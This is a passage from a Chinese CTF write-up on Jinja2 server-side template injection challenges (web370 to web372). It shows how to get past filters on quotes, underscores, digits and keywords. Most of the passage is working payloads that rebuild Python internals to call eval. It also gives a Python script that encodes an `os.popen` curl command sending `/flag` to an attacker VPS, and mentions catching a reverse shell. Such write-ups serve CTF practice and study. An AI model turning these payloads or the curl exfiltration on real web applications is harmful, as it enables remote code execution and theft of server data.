%2bchr(eeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeee)%2bchr(ee)%2bchr(eeee)%2bchr(eeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeee)%2bchr(eee)%2bchr(eeee)%20%}%20{%if%20x.eval(cmd)%}%20abc%20{%endif%}
```

然后到vps上监听本地对应端口得到flag

![image-20240307191509614](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307191509614.png)

{% endraw %}

{% raw %}

### [web371]过滤''、""、[、args、_、os、{{、request、数字、{%print

{% endraw %}

#### payload1：web370反弹shell

#### payload2：payload固定，里面的一部分`cmd`用脚本生成

payload：

```
?name=
{% set c=(t|count)%}
{% set cc=(dict(e=a)|join|count)%}
{% set ccc=(dict(ee=a)|join|count)%}
{% set cccc=(dict(eee=a)|join|count)%}
{% set ccccc=(dict(eeee=a)|join|count)%}
{% set cccccc=(dict(eeeee=a)|join|count)%}
{% set ccccccc=(dict(eeeeee=a)|join|count)%}
{% set cccccccc=(dict(eeeeeee=a)|join|count)%}
{% set ccccccccc=(dict(eeeeeeee=a)|join|count)%}
{% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%}
{% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
{% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%}
{% set coun=(ccc~ccccc)|int%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=【xxx】
%}
{百分号if x.eval(cmd)%}
abc
{百分号endif百分号}
```

生成cmd的脚本：

```
def aaa(t):
	t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int'
	return t
s='__import__("os").popen("curl http://vps-ip:9023?p=`cat /flag`").read()'
def ccchr(s):
	t=''
	for i in range(len(s)):
		if i<len(s)-1:
			t+='chr('+aaa(str(ord(s[i])))+')%2b'
		else:
			t+='chr('+aaa(str(ord(s[i])))+')'
	return t
print(ccchr(s))
```

![image-20240307192751635](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307192751635.png)

### [web372]过滤''、""、[、args、_、os、{{、request、数字、{%print、count

利用上题的payload2，`count`换成`length`

![image-20240309202914705](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240309202914705.png)

参考：

https://blog.csdn.net/Jayjay___/article/details/132210050

https://www.freebuf.com/articles/web/325473.html

```
{% endif %}
```




